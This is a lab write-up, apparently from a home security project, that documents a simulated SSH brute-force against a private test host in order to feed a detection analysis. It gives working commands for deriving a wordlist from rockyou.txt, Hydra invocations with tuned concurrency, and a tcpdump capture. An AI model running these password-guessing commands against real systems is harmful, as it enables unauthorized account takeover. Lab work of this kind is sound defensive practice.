# Attack Simulation: SSH Brute-Force with Hydra

## Target

- Host: `192.168.50.10` (Ubuntu Server, agent name `target-pc`)
- Service: SSH (TCP/22), password authentication enabled
- Account: `testuser` (deliberately weak password, planted in a custom wordlist)

## Wordlist Derivation

Rather than committing the full `rockyou.txt` corpus (14M+ lines) or using it unmodified, a small custom wordlist was derived and clearly renamed to avoid any confusion with the original file:

```bash
head -n 150 /usr/share/wordlists/rockyou.txt > temp_top.txt
sed -n '25072p' /usr/share/wordlists/rockyou.txt > temp_target.txt   # the known test-account password
tail -n 150 /usr/share/wordlists/rockyou.txt > temp_bottom.txt

cat temp_top.txt temp_target.txt temp_bottom.txt > custom-wordlist-bincom-lab.txt
rm temp_top.txt temp_target.txt temp_bottom.txt
```

This produces a ~301-entry file with the correct password sitting roughly in the middle, giving a realistic "storm of failures, then a success" pattern rather than an instant or exhaustive crack.

> The actual test password is intentionally **not** included in this repository. It sits at approximately line 151 of `custom-wordlist-bincom-lab.txt`, which is not committed here for the same reason.

## Attack Execution

### Attempt 1: default concurrency (failed)

```bash
hydra -l testuser -P custom-wordlist-bincom-lab.txt ssh://192.168.50.10
```
**Result:** failed. Hydra's default 16 parallel connections exceeded the SSH daemon's own connection-throttling (`MaxStartups`) threshold:
```
[ERROR] all children were disabled due too many connection errors
```
This is a legitimate, incidental defensive control worth noting in its own right: it disrupted the naive high-concurrency attempt before any credential was fully tested.

### Attempt 2: reduced concurrency (succeeded)

```bash
hydra -l testuser -P custom-wordlist-bincom-lab.txt -t 4 ssh://192.168.50.10 | tee hydra_output.txt
```
`-t 4` capped parallelism at 4 connections, staying under the throttling threshold. This run completed successfully and identified the correct credential.

## Packet Capture

Run in a separate terminal, started before Hydra and stopped immediately after, scoped tightly to attacker↔victim SSH traffic only (to avoid capturing unrelated LAN noise):

```bash
sudo tcpdump -i eth0 -w ssh_bruteforce_capture.pcap host 192.168.50.10 and port 22
```

## Attack Timeline (as observed)

| Event | Timestamp |
|---|---|
| First failed-login activity detected | 2026-09-21 22:10:34 |
| Successful login (credential cracked) | 2026-09-21 22:16:57 |
| Total attack duration | ~6 min 23 sec |

See [`../04-detection-analysis/incident-analysis-report.md`](../04-detection-analysis/incident-analysis-report.md) for the full SIEM-side detection analysis of this timeline.

## Evidence Files (not committed to this public repo by default)

- `hydra_output.txt`: full Hydra terminal output
- `ssh_bruteforce_capture.pcap`: scoped packet capture
- `custom-wordlist-bincom-lab.txt`: derived wordlist (excluding the actual planted password, or redacted before committing)

If you choose to include these locally/privately, place them in this folder.
